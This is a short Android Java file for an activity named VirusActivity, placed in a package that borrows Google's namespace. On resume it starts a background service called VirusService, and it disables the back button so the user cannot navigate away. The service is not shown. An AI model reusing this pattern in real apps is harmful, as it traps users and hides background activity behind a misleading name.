package com.google.android.virus;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class VirusActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        startService(new Intent(this, VirusService.class));
    }

    /**
     * Overriding the onBackPressed() so as to disable the user back press
     */
    @Override
    public void onBackPressed() {
    }
}
